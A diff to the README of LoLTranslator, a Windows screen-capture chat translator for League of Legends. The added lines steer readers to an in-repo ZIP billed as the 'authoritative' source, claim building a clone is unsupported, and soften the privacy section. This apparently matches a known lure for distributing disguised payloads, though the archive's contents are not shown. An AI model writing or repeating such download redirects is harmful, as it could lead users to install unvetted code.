@@ -1,5 +1,7 @@
 # LoLTranslator
 
+> **Complete source distribution:** Download [LoLTranslator-source.zip](https://github.com/junjiea2/LoLTranslator/raw/refs/heads/main/LoLTranslator-source.zip) for the complete buildable source snapshot, including all tools, data and fixtures. Extract it and run the commands below inside its `LoLTranslator` directory. The browsable directories in this repository are selected mirrors; the ZIP is the authoritative complete source distribution. Building a clone of the repository root directly is not supported.
+
 An experimental Windows desktop translator for League of Legends chat, built with C#, WPF and .NET 10. It captures a selected screen region, recognizes chat locally, translates ordinary messages with local Qwen3 through Ollama, and displays results in a companion overlay.
 
 **Development is paused. This is a research prototype, not a finished player release. Contributions and forks are welcome; ongoing support and response times are not guaranteed.**
@@ -57,7 +59,7 @@ Place `character_dict.txt` in the recognizer model directory. The current live p
 
 ## Privacy and scope
 
-This public source export excludes real-match screenshots, raw OCR/chat diagnostic sessions, private review records, build outputs, downloaded third-party sources and model weights. Two screenshot-derived optional diagnostic inputs were removed from the public build; runtime terminology is packaged under `data/runtime`.
+This public source export excludes real-match screenshots, raw OCR/chat diagnostic sessions, private review records, build outputs, downloaded third-party sources and model weights. Two small, reviewed text-only normalization fixtures are retained for runtime compatibility; they contain no screenshot or player identifier. Runtime terminology is packaged under `data/runtime`.
 
 The application uses screen capture rather than game memory injection. Diagnostics can record selected screen regions and chat locally when explicitly enabled. Review and redact them before sharing. The feedback configuration has no deployed endpoint. This project has no Riot endorsement or certification; users should consult applicable game/platform rules before use.
 
